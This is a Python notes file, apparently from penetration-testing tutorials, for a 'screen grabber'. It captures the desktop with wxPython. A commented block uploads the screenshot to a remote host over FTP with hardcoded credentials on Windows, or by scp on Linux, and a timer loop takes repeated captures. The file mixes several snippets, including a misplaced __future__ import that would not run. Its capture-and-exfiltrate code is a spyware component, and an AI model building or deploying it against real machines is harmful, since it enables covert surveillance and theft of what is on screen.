#############################################################################
#
# Effective Python Penetration Testing von Rejah Rehim
# Python Penetration Testing - Building a Screen Grabber - Part 3 Cristi Vlad
#
#############################################################################

"""

https://pythonspot.com/tag/wx/
https://wxpython.org/Phoenix/docs/html/wx.ScreenDC.html
https://www.tutorialspoint.com/wxpython/wxpython_drawing_api.htm

https://www.programcreek.com/python/example/20269/wx.ScreenDC
https://www.blog.pythonlibrary.org/2010/04/16/how-to-take-a-screenshot-of-your-wxpython-app-and-print-it/

# Install necessary development tools, libs, etc.
# apt-get install -y build-essential dpkg-dev


# pip install wxpython
# sudo apt install python-wxgtk3.0 python-wxgtk3.0-dev
sudo apt-get install python-wxtools
sudo apt-get install python-wxtools

"""

#!/usr/bin/python

import wx
import platform
import ftplib
import os


w = wx.App()
screen = wx.ScreenDC()
size = screen.GetSize()

bmap = wx.EmptyBitmap(size[0], size[1])
mem = wx.MemoryDCFromDC(bmap)
mem.Blit(0, 0, size[0], size[1], screen, 0, 0)

del mem
bmap.SaveFile("screenshot.png", wx.BITMAP_TYPE_PNG)

"""

if platform.system() == "Windows":
	sess = ftplib.FTP('192.168.0.101','ftpuser','ftppass')
	file = open("screenshot.png", 'rb')
	sess.storbinary("STOR /tmp/screenshot.png", file)
	file.close()
	sess.quit()

if platform.system() == "Linux":
	os.system("scp screenshot.png username@127.0.0.1:/tmp/")

"""

###### Version 2 ######
# https://stackoverflow.com/questions/42984666/multiple-screenshots-using-screendc-wxpython
# https://stackoverflow.com/questions/8644908/take-screenshot-in-python-cross-platform

"""
import wx
app = wx.App(False)
s = wx.ScreenDC()
w, h = s.Size.Get()
b = wx.EmptyBitmap(w, h)
m = wx.MemoryDCFromDC(s)
m.SelectObject(b)
m.Blit(0, 0, w, h, s, 0, 0)
m.SelectObject(wx.NullBitmap)
b.SaveFile("screenshot.png", wx.BITMAP_TYPE_PNG)


imgCtrl = wx.StaticBitmap(self.panel, wx.ID_ANY, wx.EmptyBitmap(500,500))


import sys
from PyQt5.QtGui import QGuiApplication
from PyQt5.QtWidgets import QApplication

app = QApplication(sys.argv)
screen = QGuiApplication.primaryScreen()
desktopPixmap = screen.grabWindow(0)
desktopPixmap.save('screendump.png')

"""



from __future__ import print_function

import wx
from datetime import datetime
from time import sleep

IS_PHOENIX = True if 'phoenix' in wx.version() else False

if IS_PHOENIX:
    EmptyBitmap = lambda *args, **kwds: wx.Bitmap(*args, **kwds)
else:
    EmptyBitmap = lambda *args, **kwds: wx.EmptyBitmap(*args, **kwds)

def take_screenshot():
    screen = wx.ScreenDC()
    size = screen.GetSize()
    width = size[0]
    height = size[1]
    bmp = EmptyBitmap(width, height)
    mem = wx.MemoryDC(bmp)
    mem.Blit(0, 0, width, height, screen, 0, 0)
    bmp.SaveFile(str(datetime.now().second) + '.png', wx.BITMAP_TYPE_PNG)

MAXPICS = 4

class testfrm(wx.Frame):
    def __init__(self, *args, **kwds):
        wx.Frame.__init__(self, *args, **kwds)
        self.tmr = wx.Timer(self, -1)
        self.countpics = 0
        self.Bind(wx.EVT_TIMER, self.ontimer, self.tmr)
        self.ontimer(None)

    def ontimer(self, evt):
        if self.countpics <=MAXPICS:
            self.tmr.Start(3000, wx.TIMER_ONE_SHOT)
            take_screenshot()
            self.countpics += 1
        else:
            self.Close()


if __name__ == '__main__':
    app = wx.App()
    frm = testfrm(None, -1, wx.version())
    app.MainLoop()
